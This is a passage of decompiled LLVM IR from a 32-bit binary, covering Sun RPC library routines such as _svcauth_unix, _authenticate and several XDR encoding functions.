  %v2_8063aea = load i32, i32* %v1_8063aea, align 4
  store i32 %v2_8063aea, i32* %eax.global-to-local, align 4
  %v0_8063aec = load i32, i32* @ebx, align 4
  %v5_8063aee = icmp slt i32 %v0_8063aec, %v2_8063aea
  br i1 %v5_8063aee, label %dec_label_pc_8063ac0, label %dec_label_pc_8063af0

dec_label_pc_8063af0:                             ; preds = %dec_label_pc_8063ae3
  %v1_8063af0 = add i32 %v2_8063aea, 1
  store i32 %v1_8063af0, i32* %eax.global-to-local, align 4
  store i32 %v1_8063af0, i32* %v1_8063aea, align 4
  %v0_8063af3 = call i32 @__rpc_thread_svc_pollfd()
  store i32 %v0_8063af3, i32* %eax.global-to-local, align 4
  store i32 %v0_8063af3, i32* @ebx, align 4
  %v0_8063afc = load i32, i32* @esi, align 4
  %v1_8063afc = inttoptr i32 %v0_8063afc to i32*
  %v2_8063afc = load i32, i32* %v1_8063afc, align 4
  %v2_8063afe = mul i32 %v2_8063afc, 8
  store i32 %v2_8063afe, i32* %eax.global-to-local, align 4
  store i32 %v2_8063afe, i32* %stack_var_-24, align 4
  %v1_8063b02 = inttoptr i32 %v0_8063af3 to i32*
  %v2_8063b02 = load i32, i32* %v1_8063b02, align 4
  store i32 %v2_8063b02, i32* %stack_var_-28, align 4
  %v4_8063b04 = inttoptr i32 %v2_8063b02 to i32*
  %v5_8063b04 = call i32 @realloc(i32* %v4_8063b04, i32 %v2_8063afe, i32 %v0_8063af3, i32 %v0_8063af3)
  store i32 %v5_8063b04, i32* %eax.global-to-local, align 4
  %v1_8063b0c = load i32, i32* @ebx, align 4
  %v2_8063b0c = inttoptr i32 %v1_8063b0c to i32*
  store i32 %v5_8063b04, i32* %v2_8063b0c, align 4
  %v0_8063b0e = load i32, i32* %eax.global-to-local, align 4
  %v1_8063b10 = icmp eq i32 %v0_8063b0e, 0
  br i1 %v1_8063b10, label %dec_label_pc_8063b25, label %dec_label_pc_8063b14

dec_label_pc_8063b14:                             ; preds = %dec_label_pc_8063af0
  %v0_8063b14 = load i32, i32* @esi, align 4
  %v1_8063b14 = inttoptr i32 %v0_8063b14 to i32*
  %v2_8063b14 = load i32, i32* %v1_8063b14, align 4
  store i32 %v2_8063b14, i32* %eax.global-to-local, align 4
  %v0_8063b16 = load i32, i32* @edi, align 4
  %v3_8063b16 = mul i32 %v2_8063b14, 8
  %v4_8063b16 = add i32 %v0_8063b0e, -8
  %v5_8063b16 = add i32 %v4_8063b16, %v3_8063b16
  %v6_8063b16 = inttoptr i32 %v5_8063b16 to i32*
  store i32 %v0_8063b16, i32* %v6_8063b16, align 4
  %v0_8063b1a = load i32, i32* @esi, align 4
  %v1_8063b1a = inttoptr i32 %v0_8063b1a to i32*
  %v2_8063b1a = load i32, i32* %v1_8063b1a, align 4
  %v0_8063b1c = load i32, i32* @ebx, align 4
  %v1_8063b1c = inttoptr i32 %v0_8063b1c to i32*
  %v2_8063b1c = load i32, i32* %v1_8063b1c, align 4
  store i32 %v2_8063b1c, i32* %eax.global-to-local, align 4
  %v2_8063b1e = mul i32 %v2_8063b1a, 8
  %v3_8063b1e = add i32 %v2_8063b1e, -4
  %v4_8063b1e = add i32 %v3_8063b1e, %v2_8063b1c
  %v5_8063b1e = inttoptr i32 %v4_8063b1e to i16*
  store i16 195, i16* %v5_8063b1e, align 2
  br label %dec_label_pc_8063b25

dec_label_pc_8063b25:                             ; preds = %dec_label_pc_8063a8b, %dec_label_pc_8063af0, %dec_label_pc_8063a69, %dec_label_pc_8063ad5, %dec_label_pc_8063b14
  %v0_8063b28 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8063b28

; uselistorder directives
  uselistorder i32 %v2_8063afe, { 2, 1, 0 }
  uselistorder i32 %v2_8063ab0, { 1, 0 }
  uselistorder i32 %v0_8063aae, { 1, 0 }
  uselistorder i32 %v1_8063a9e, { 1, 0 }
  uselistorder i32 %v0_8063a90, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_8063a71, { 2, 1, 0 }
  uselistorder i32* %stack_var_-24, { 2, 0, 1 }
  uselistorder i32* %stack_var_-28, { 2, 0, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 14, 0, 1, 2, 3, 4, 8, 5, 9, 6, 7, 10, 11, 12, 13, 15, 16, 17, 18 }
  uselistorder i32 ()* @__rpc_thread_svc_max_pollfd, { 3, 2, 0, 1 }
  uselistorder i32 ()* @__rpc_thread_svc_pollfd, { 2, 1, 0 }
  uselistorder i32 ()* @__GI___rpc_thread_svc_fdset, { 1, 0 }
  uselistorder i32 1022, { 1, 2, 0 }
  uselistorder i32 (i32, i32)* @_rpc_dtablesize, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8063b25, { 4, 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_8063ae3, { 1, 0 }
  uselistorder label %dec_label_pc_8063abc, { 1, 0 }
}

define i32 @_authenticate() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8063b2d = load i32, i32* @ebx, align 4
  store i32 %v0_8063b2d, i32* %stack_var_-8, align 4
  store i32 %tmp1, i32* %ebx.global-to-local, align 4
  store i32 %tmp, i32* @esi, align 4
  %v1_8063b3b = add i32 %tmp1, 12
  %v1_8063b3e = add i32 %tmp, 24
  %v3_8063b43 = inttoptr i32 %v1_8063b3b to i16*
  %v4_8063b43 = call i32 @memcpy(i16* %v3_8063b43, i32 %v1_8063b3e, i32 12)
  %v1_8063b48 = add i32 %tmp1, 28
  %v2_8063b48 = inttoptr i32 %v1_8063b48 to i32*
  %v3_8063b48 = load i32, i32* %v2_8063b48, align 4
  %v0_8063b4b = load i32, i32* @global_var_807e520.853, align 32
  %v2_8063b53 = add i32 %v3_8063b48, 32
  %v3_8063b53 = inttoptr i32 %v2_8063b53 to i32*
  store i32 %v0_8063b4b, i32* %v3_8063b53, align 4
  %v0_8063b56 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8063b56 = add i32 %v0_8063b56, 28
  %v2_8063b56 = inttoptr i32 %v1_8063b56 to i32*
  %v3_8063b56 = load i32, i32* %v2_8063b56, align 4
  %v1_8063b59 = add i32 %v3_8063b56, 40
  %v2_8063b59 = inttoptr i32 %v1_8063b59 to i32*
  store i32 0, i32* %v2_8063b59, align 4
  %v0_8063b60 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8063b60 = add i32 %v0_8063b60, 12
  %v2_8063b60 = inttoptr i32 %v1_8063b60 to i32*
  %v3_8063b60 = load i32, i32* %v2_8063b60, align 4
  %v1_8063b70 = mul i32 %v3_8063b60, 4
  %v2_8063b70 = add i32 %v1_8063b70, ptrtoint (i32* @global_var_806e658.863 to i32)
  %v3_8063b70 = inttoptr i32 %v2_8063b70 to i32*
  %v4_8063b70 = load i32, i32* %v3_8063b70, align 4
  %v2_8063b78 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8063b78, i32* %ebx.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_8063b70)
  %v2_8063b81 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8063b81, i32* @edx, align 4
  store i32 %v2_8063b78, i32* @ebx, align 4
  ret i32 2

; uselistorder directives
  uselistorder i32 %tmp1, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
}

define i32 @_svcauth_null() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_svcauth_short() local_unnamed_addr {
entry:
  ret i32 2
}

define i32 @_svcauth_unix(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8063b8f = load i32, i32* @edi, align 4
  %v0_8063b91 = load i32, i32* @ebx, align 4
  store i32 %v0_8063b91, i32* %stack_var_-16, align 4
  %v1_8063b99 = add i32 %arg2, 24
  %v2_8063b99 = inttoptr i32 %v1_8063b99 to i32*
  %v3_8063b99 = load i32, i32* %v2_8063b99, align 4
  store i32 %v3_8063b99, i32* @edi, align 4
  %v1_8063b9c = add i32 %v3_8063b99, 24
  %v2_8063b9f = add i32 %v3_8063b99, 4
  %v3_8063b9f = inttoptr i32 %v2_8063b9f to i32*
  store i32 %v1_8063b9c, i32* %v3_8063b9f, align 4
  %v0_8063ba2 = load i32, i32* @edi, align 4
  %v1_8063ba2 = add i32 %v0_8063ba2, 280
  %v2_8063ba8 = add i32 %v0_8063ba2, 20
  %v3_8063ba8 = inttoptr i32 %v2_8063ba8 to i32*
  store i32 %v1_8063ba2, i32* %v3_8063ba8, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v1_8063baf = add i32 %arg3, 32
  %v2_8063baf = inttoptr i32 %v1_8063baf to i32*
  %v3_8063baf = load i32, i32* %v2_8063baf, align 4
  store i32 %v3_8063baf, i32* %edx.global-to-local, align 4
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  %v1_8063bbd = add i32 %arg3, 28
  %v2_8063bbd = inttoptr i32 %v1_8063bbd to i32*
  %v3_8063bbd = load i32, i32* %v2_8063bbd, align 4
  %v2_8063bc0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_8063bc0, i32* @ebx, align 4
  %v5_8063bc5 = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-40, i32 %v3_8063bbd, i32 %v3_8063baf, i32 1)
  store i32 %v2_8063bc0, i32* @esi, align 4
  store i32 %v3_8063bbd, i32* @ebp, align 4
  store i32 %tmp7, i32* @eax, align 4
  %v7_8063bd5 = add i32 %tmp7, 24
  %v8_8063bd5 = inttoptr i32 %v7_8063bd5 to i32*
  %v9_8063bd5 = load i32, i32* %v8_8063bd5, align 4
  call void @__pseudo_call(i32 %v9_8063bd5)
  store i32 %tmp7, i32* %edx.global-to-local, align 4
  %v1_8063bdd = icmp eq i32 %tmp7, 0
  br i1 %v1_8063bdd, label %dec_label_pc_8063c72, label %dec_label_pc_8063be5

dec_label_pc_8063be5:                             ; preds = %entry
  %v1_8063be5 = inttoptr i32 %tmp7 to i32*
  %v2_8063be5 = load i32, i32* %v1_8063be5, align 4
  %v1_8063be7 = call i32 @llvm.bswap.i32(i32 %v2_8063be5)
  %v1_8063be9 = load i32, i32* @edi, align 4
  %v2_8063be9 = inttoptr i32 %v1_8063be9 to i32*
  store i32 %v1_8063be7, i32* %v2_8063be9, align 4
  %v0_8063beb = load i32, i32* %edx.global-to-local, align 4
  %v1_8063beb = add i32 %v0_8063beb, 4
  %v2_8063beb = inttoptr i32 %v1_8063beb to i32*
  %v3_8063beb = load i32, i32* %v2_8063beb, align 4
  %v1_8063bee = call i32 @llvm.bswap.i32(i32 %v3_8063beb)
  store i32 %v1_8063bee, i32* @esi, align 4
  %v6_8063bf6 = icmp ugt i32 %v1_8063bee, 255
  br i1 %v6_8063bf6, label %dec_label_pc_8063cef, label %dec_label_pc_8063bfc

dec_label_pc_8063bfc:                             ; preds = %dec_label_pc_8063be5
  %v1_8063bfc = add i32 %v0_8063beb, 8
  store i32 %v1_8063bfc, i32* %ebx.global-to-local, align 4
  %v0_8063c02 = load i32, i32* @edi, align 4
  %v1_8063c02 = add i32 %v0_8063c02, 4
  %v2_8063c02 = inttoptr i32 %v1_8063c02 to i32*
  %v3_8063c02 = load i32, i32* %v2_8063c02, align 4
  %v1_8063c05 = add i32 %v1_8063bee, 3
  store i32 %v1_8063c05, i32* %ebp.global-to-local, align 4
  %tmp25 = inttoptr i32 %v3_8063c02 to i16*
  %v5_8063c08 = call i32 @memcpy(i16* %tmp25, i32 %v1_8063bfc, i32 %v1_8063bee)
  %v1_8063c0d = and i32 %v1_8063c05, -4
  store i32 %v1_8063c0d, i32* %ebp.global-to-local, align 4
  %v0_8063c10 = load i32, i32* @edi, align 4
  %v1_8063c10 = add i32 %v0_8063c10, 4
  %v2_8063c10 = inttoptr i32 %v1_8063c10 to i32*
  %v3_8063c10 = load i32, i32* %v2_8063c10, align 4
  %v0_8063c16 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8063c16 = add i32 %v0_8063c16, %v1_8063c0d
  store i32 %v2_8063c16, i32* %edx.global-to-local, align 4
  %v2_8063c19 = add i32 %v3_8063c10, %v1_8063bee
  %v3_8063c19 = inttoptr i32 %v2_8063c19 to i8*
  store i8 0, i8* %v3_8063c19, align 1
  %v0_8063c1d = load i32, i32* %edx.global-to-local, align 4
  %v1_8063c1d = inttoptr i32 %v0_8063c1d to i32*
  %v2_8063c1d = load i32, i32* %v1_8063c1d, align 4
  %v1_8063c1f = call i32 @llvm.bswap.i32(i32 %v2_8063c1d)
  %v1_8063c21 = load i32, i32* @edi, align 4
  %v2_8063c21 = add i32 %v1_8063c21, 8
  %v3_8063c21 = inttoptr i32 %v2_8063c21 to i32*
  store i32 %v1_8063c1f, i32* %v3_8063c21, align 4
  %v0_8063c24 = load i32, i32* %edx.global-to-local, align 4
  %v1_8063c24 = add i32 %v0_8063c24, 4
  %v2_8063c24 = inttoptr i32 %v1_8063c24 to i32*
  %v3_8063c24 = load i32, i32* %v2_8063c24, align 4
  %v1_8063c27 = call i32 @llvm.bswap.i32(i32 %v3_8063c24)
  %v1_8063c29 = load i32, i32* @edi, align 4
  %v2_8063c29 = add i32 %v1_8063c29, 12
  %v3_8063c29 = inttoptr i32 %v2_8063c29 to i32*
  store i32 %v1_8063c27, i32* %v3_8063c29, align 4
  %v0_8063c2c = load i32, i32* %edx.global-to-local, align 4
  %v1_8063c2c = add i32 %v0_8063c2c, 8
  %v2_8063c2c = inttoptr i32 %v1_8063c2c to i32*
  %v3_8063c2c = load i32, i32* %v2_8063c2c, align 4
  %v1_8063c2f = call i32 @llvm.bswap.i32(i32 %v3_8063c2c)
  store i32 %v1_8063c2f, i32* %ecx.global-to-local, align 4
  %v6_8063c34 = icmp ugt i32 %v1_8063c2f, 16
  br i1 %v6_8063c34, label %dec_label_pc_8063cef, label %dec_label_pc_8063c3a

dec_label_pc_8063c3a:                             ; preds = %dec_label_pc_8063bfc
  %v1_8063c3a = add i32 %v0_8063c2c, 12
  store i32 %v1_8063c3a, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v1_8063c3f = load i32, i32* @edi, align 4
  %v2_8063c3f = add i32 %v1_8063c3f, 16
  %v3_8063c3f = inttoptr i32 %v2_8063c3f to i32*
  store i32 %v1_8063c2f, i32* %v3_8063c3f, align 4
  %v0_8063c52.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8063c5228 = icmp ult i32 %v0_8063c52.pre, %v1_8063c2f
  br i1 %v7_8063c5228, label %dec_label_pc_8063c44, label %dec_label_pc_8063c56

dec_label_pc_8063c44:                             ; preds = %dec_label_pc_8063c3a, %dec_label_pc_8063c44
  %v2_8063c4e29 = phi i32 [ %v1_8063c51, %dec_label_pc_8063c44 ], [ %v0_8063c52.pre, %dec_label_pc_8063c3a ]
  %v0_8063c44 = load i32, i32* @edi, align 4
  %v1_8063c44 = add i32 %v0_8063c44, 20
  %v2_8063c44 = inttoptr i32 %v1_8063c44 to i32*
  %v3_8063c44 = load i32, i32* %v2_8063c44, align 4
  store i32 %v3_8063c44, i32* %edx.global-to-local, align 4
  %v0_8063c47 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8063c47 = inttoptr i32 %v0_8063c47 to i32*
  %v2_8063c47 = load i32, i32* %v1_8063c47, align 4
  %v1_8063c49 = add i32 %v0_8063c47, 4
  store i32 %v1_8063c49, i32* %ebx.global-to-local, align 4
  %v1_8063c4c = call i32 @llvm.bswap.i32(i32 %v2_8063c47)
  %v3_8063c4e = mul i32 %v2_8063c4e29, 4
  %v4_8063c4e = add i32 %v3_8063c44, %v3_8063c4e
  %v5_8063c4e = inttoptr i32 %v4_8063c4e to i32*
  store i32 %v1_8063c4c, i32* %v5_8063c4e, align 4
  %v0_8063c51 = load i32, i32* %esi.global-to-local, align 4
  %v1_8063c51 = add i32 %v0_8063c51, 1
  store i32 %v1_8063c51, i32* %esi.global-to-local, align 4
  %v7_8063c52 = icmp ult i32 %v1_8063c51, %v1_8063c2f
  br i1 %v7_8063c52, label %dec_label_pc_8063c44, label %dec_label_pc_8063c56

dec_label_pc_8063c56:                             ; preds = %dec_label_pc_8063c44, %dec_label_pc_8063c3a
  %v0_8063c56 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8063c56 = mul i32 %v1_8063c2f, 4
  %v3_8063c56 = add i32 %v2_8063c56, 20
  %v4_8063c56 = add i32 %v3_8063c56, %v0_8063c56
  %tmp = icmp ugt i32 %v4_8063c56, %tmp6
  br i1 %tmp, label %dec_label_pc_8063c60, label %dec_label_pc_8063c9d

dec_label_pc_8063c60:                             ; preds = %dec_label_pc_8063c56
  %v6_8063c6b = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @global_var_806e664.864, i32 0, i32 0), i32 %v1_8063c2f, i32 %v0_8063c56, i32 %tmp6)
  br label %dec_label_pc_8063c93

dec_label_pc_8063c72:                             ; preds = %entry
  %v0_8063c74 = load i32, i32* @edi, align 4
  %v6_8063c76 = call i32 @__GI_xdr_authunix_parms(i32* nonnull %stack_var_-40, i32 %v0_8063c74, i32 0, i32 0)
  store i32 %v6_8063c76, i32* @eax, align 4
  %v1_8063c7e = icmp eq i32 %v6_8063c76, 0
  %v1_8063c80 = icmp eq i1 %v1_8063c7e, false
  br i1 %v1_8063c80, label %dec_label_pc_8063c9d, label %dec_label_pc_8063c82

dec_label_pc_8063c82:                             ; preds = %dec_label_pc_8063c72
  %v0_8063c8c = load i32, i32* @edi, align 4
  %v6_8063c8e = call i32 @__GI_xdr_authunix_parms(i32* nonnull %stack_var_-40, i32 %v0_8063c8c, i32 %v6_8063c76, i32 %v6_8063c76)
  br label %dec_label_pc_8063c93

dec_label_pc_8063c93:                             ; preds = %dec_label_pc_8063c60, %dec_label_pc_8063c82
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8063cf4

dec_label_pc_8063c9d:                             ; preds = %dec_label_pc_8063c56, %dec_label_pc_8063c72
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8063ca5 = add i32 %arg2, 44
  %v2_8063ca5 = inttoptr i32 %v1_8063ca5 to i32*
  %v3_8063ca5 = load i32, i32* %v2_8063ca5, align 4
  %v4_8063ca5 = icmp eq i32 %v3_8063ca5, 0
  %v1_8063ca9 = add i32 %arg1, 28
  %v2_8063ca9 = inttoptr i32 %v1_8063ca9 to i32*
  %v3_8063ca9 = load i32, i32* %v2_8063ca9, align 4
  store i32 %v3_8063ca9, i32* %edx.global-to-local, align 4
  br i1 %v4_8063ca5, label %dec_label_pc_8063cd6, label %dec_label_pc_8063cae

dec_label_pc_8063cae:                             ; preds = %dec_label_pc_8063c9d
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  %v1_8063cb0 = add i32 %arg2, 36
  %v2_8063cb0 = inttoptr i32 %v1_8063cb0 to i32*
  %v3_8063cb0 = load i32, i32* %v2_8063cb0, align 4
  %v2_8063cb3 = add i32 %v3_8063ca9, 32
  %v3_8063cb3 = inttoptr i32 %v2_8063cb3 to i32*
  store i32 %v3_8063cb0, i32* %v3_8063cb3, align 4
  %v3_8063cba = load i32, i32* %v2_8063ca9, align 4
  store i32 %v3_8063cba, i32* %edx.global-to-local, align 4
  %v0_8063cbd = load i32, i32* %ecx.global-to-local, align 4
  %v1_8063cbd = add i32 %v0_8063cbd, 40
  %v2_8063cbd = inttoptr i32 %v1_8063cbd to i32*
  %v3_8063cbd = load i32, i32* %v2_8063cbd, align 4
  %v2_8063cc0 = add i32 %v3_8063cba, 36
  %v3_8063cc0 = inttoptr i32 %v2_8063cc0 to i32*
  store i32 %v3_8063cbd, i32* %v3_8063cc0, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v3_8063cc7 = load i32, i32* %v2_8063ca9, align 4
  store i32 %v3_8063cc7, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  %v3_8063cce = load i32, i32* %v2_8063ca5, align 4
  %v2_8063cd1 = add i32 %v3_8063cc7, 40
  %v3_8063cd1 = inttoptr i32 %v2_8063cd1 to i32*
  store i32 %v3_8063cce, i32* %v3_8063cd1, align 4
  br label %dec_label_pc_8063ceb

dec_label_pc_8063cd6:                             ; preds = %dec_label_pc_8063c9d
  %v1_8063cd6 = add i32 %v3_8063ca9, 32
  %v2_8063cd6 = inttoptr i32 %v1_8063cd6 to i32*
  store i32 0, i32* %v2_8063cd6, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v3_8063ce1 = load i32, i32* %v2_8063ca9, align 4
  %v1_8063ce4 = add i32 %v3_8063ce1, 40
  %v2_8063ce4 = inttoptr i32 %v1_8063ce4 to i32*
  store i32 0, i32* %v2_8063ce4, align 4
  br label %dec_label_pc_8063ceb

dec_label_pc_8063ceb:                             ; preds = %dec_label_pc_8063cae, %dec_label_pc_8063cd6
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8063cf4

dec_label_pc_8063cef:                             ; preds = %dec_label_pc_8063bfc, %dec_label_pc_8063be5
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8063cf4

dec_label_pc_8063cf4:                             ; preds = %dec_label_pc_8063ceb, %dec_label_pc_8063c93, %dec_label_pc_8063cef
  %v0_8063d0f5 = phi i32 [ 0, %dec_label_pc_8063ceb ], [ 1, %dec_label_pc_8063c93 ], [ 1, %dec_label_pc_8063cef ]
  %v3_8063cf4 = load i32, i32* %stack_var_-40, align 4
  %v1_8063cf8 = add i32 %v3_8063cf4, 28
  %v2_8063cf8 = inttoptr i32 %v1_8063cf8 to i32*
  %v3_8063cf8 = load i32, i32* %v2_8063cf8, align 4
  store i32 %v3_8063cf8, i32* %edx.global-to-local, align 4
  %v1_8063cfb = icmp eq i32 %v3_8063cf8, 0
  br i1 %v1_8063cfb, label %dec_label_pc_8063d0c, label %dec_label_pc_8063cff

dec_label_pc_8063cff:                             ; preds = %dec_label_pc_8063cf4
  call void @__pseudo_call(i32 %v3_8063cf8)
  %v0_8063d0f.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8063d0c

dec_label_pc_8063d0c:                             ; preds = %dec_label_pc_8063cf4, %dec_label_pc_8063cff
  %v0_8063d0f = phi i32 [ %v0_8063d0f.pre, %dec_label_pc_8063cff ], [ %v0_8063d0f5, %dec_label_pc_8063cf4 ]
  %v2_8063d12 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8063d12, i32* %esi.global-to-local, align 4
  store i32 %v0_8063b8f, i32* %ebp.global-to-local, align 4
  ret i32 %v0_8063d0f

; uselistorder directives
  uselistorder i32 %v3_8063ca9, { 1, 0, 2 }
  uselistorder i32* %v2_8063ca9, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8063c51, { 1, 2, 0 }
  uselistorder i32 %v1_8063c2f, { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32* %stack_var_-40, { 3, 0, 1, 2, 4 }
  uselistorder i32 %tmp7, { 0, 2, 1, 4, 3 }
  uselistorder i32 %tmp6, { 1, 0 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 4, 2, 5, 6 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 (i8*, ...)* @printf, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg3, { 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 4, 1, 0, 3, 2 }
  uselistorder i32 %arg1, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8063d0c, { 1, 0 }
  uselistorder label %dec_label_pc_8063cf4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8063ceb, { 1, 0 }
  uselistorder label %dec_label_pc_8063c9d, { 1, 0 }
  uselistorder label %dec_label_pc_8063c93, { 1, 0 }
  uselistorder label %dec_label_pc_8063c44, { 1, 0 }
}

define i32 @xdr_free(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 2, i32* %stack_var_-24, align 4
  %v2_8063d27 = ptrtoint i32* %stack_var_-24 to i32
  %v1_8063d2c = call i32 @unknown_0(i32 %v2_8063d27)
  ret i32 %v1_8063d2c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32)* @unknown_0, { 4, 3, 2, 1, 0 }
}

define i32 @xdr_void() local_unnamed_addr {
entry:
  ret i32 1
}

define i32 @__GI_xdr_long() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v1_8063d42 = inttoptr i32 %tmp2 to i32*
  %v2_8063d42 = load i32, i32* %v1_8063d42, align 4
  store i32 %v2_8063d42, i32* %eax.global-to-local, align 4
  %v1_8063d44 = icmp eq i32 %v2_8063d42, 0
  %v1_8063d46 = icmp eq i1 %v1_8063d44, false
  br i1 %v1_8063d46, label %dec_label_pc_8063d50, label %dec_label_pc_8063d48

dec_label_pc_8063d48:                             ; preds = %entry
  %v1_8063d48 = add i32 %tmp2, 4
  %v2_8063d48 = inttoptr i32 %v1_8063d48 to i32*
  %v3_8063d48 = load i32, i32* %v2_8063d48, align 4
  store i32 %v3_8063d48, i32* %eax.global-to-local, align 4
  %v1_8063d4b = add i32 %v3_8063d48, 4
  br label %dec_label_pc_8063d62

dec_label_pc_8063d50:                             ; preds = %entry
  %v9_8063d50 = icmp eq i32 %v2_8063d42, 1
  %v1_8063d53 = icmp eq i1 %v9_8063d50, false
  br i1 %v1_8063d53, label %dec_label_pc_8063d64, label %dec_label_pc_8063d55

dec_label_pc_8063d55:                             ; preds = %dec_label_pc_8063d50
  %v1_8063d55 = add i32 %tmp2, 4
  %v2_8063d55 = inttoptr i32 %v1_8063d55 to i32*
  %v3_8063d55 = load i32, i32* %v2_8063d55, align 4
  store i32 %v3_8063d55, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8063d62

dec_label_pc_8063d62:                             ; preds = %dec_label_pc_8063d48, %dec_label_pc_8063d55
  %storemerge.in.in = phi i32 [ %v1_8063d4b, %dec_label_pc_8063d48 ], [ %v3_8063d55, %dec_label_pc_8063d55 ]
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @ecx, align 4
  call void @__pseudo_branch(i32 %storemerge)
  %v0_8063d64.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8063d64

dec_label_pc_8063d64:                             ; preds = %dec_label_pc_8063d50, %dec_label_pc_8063d62
  %v0_8063d64 = phi i32 [ %v2_8063d42, %dec_label_pc_8063d50 ], [ %v0_8063d64.pre, %dec_label_pc_8063d62 ]
  %v9_8063d64 = icmp eq i32 %v0_8063d64, 2
  %v1_8063d67 = zext i1 %v9_8063d64 to i32
  store i32 %v1_8063d67, i32* %eax.global-to-local, align 4
  ret i32 %v1_8063d67

; uselistorder directives
  uselistorder i32 %v2_8063d42, { 1, 0, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_8063d64, { 1, 0 }
  uselistorder label %dec_label_pc_8063d62, { 1, 0 }
}

define i32 @xdr_short(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp8 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v2_8063d7a = load i32, i32* %arg1, align 4
  %v9_8063d7c = icmp eq i32 %v2_8063d7a, 1
  br i1 %v9_8063d7c, label %dec_label_pc_8063da9, label %dec_label_pc_8063d81

dec_label_pc_8063d81:                             ; preds = %entry
  %v5_8063d7c = icmp eq i32 %v2_8063d7a, 0
  br i1 %v5_8063d7c, label %dec_label_pc_8063d8f, label %dec_label_pc_8063d83

dec_label_pc_8063d83:                             ; preds = %dec_label_pc_8063d81
  %v9_8063d88 = icmp eq i32 %v2_8063d7a, 2
  br i1 %v9_8063d88, label %dec_label_pc_8063dcd, label %dec_label_pc_8063dcb

dec_label_pc_8063d8f:                             ; preds = %dec_label_pc_8063d81
  %v1_8063d8f = inttoptr i32 %arg2 to i16*
  %v2_8063d8f = load i16, i16* %v1_8063d8f, align 2
  %v3_8063d8f = sext i16 %v2_8063d8f to i32
  store i32 %v3_8063d8f, i32* %stack_var_-8, align 4
  %v1_8063d98 = add i32 %tmp8, 4
  %v2_8063d98 = inttoptr i32 %v1_8063d98 to i32*
  %v3_8063d98 = load i32, i32* %v2_8063d98, align 4
  %v2_8063d9b = ptrtoint i32* %stack_var_-8 to i32
  %v5_8063da1 = add i32 %v3_8063d98, 4
  %v6_8063da1 = inttoptr i32 %v5_8063da1 to i32*
  %v7_8063da1 = load i32, i32* %v6_8063da1, align 4
  call void @__pseudo_call(i32 %v7_8063da1)
  br label %dec_label_pc_8063dcd

dec_label_pc_8063da9:                             ; preds = %entry
  %v1_8063dab = add i32 %tmp8, 4
  %v2_8063dab = inttoptr i32 %v1_8063dab to i32*
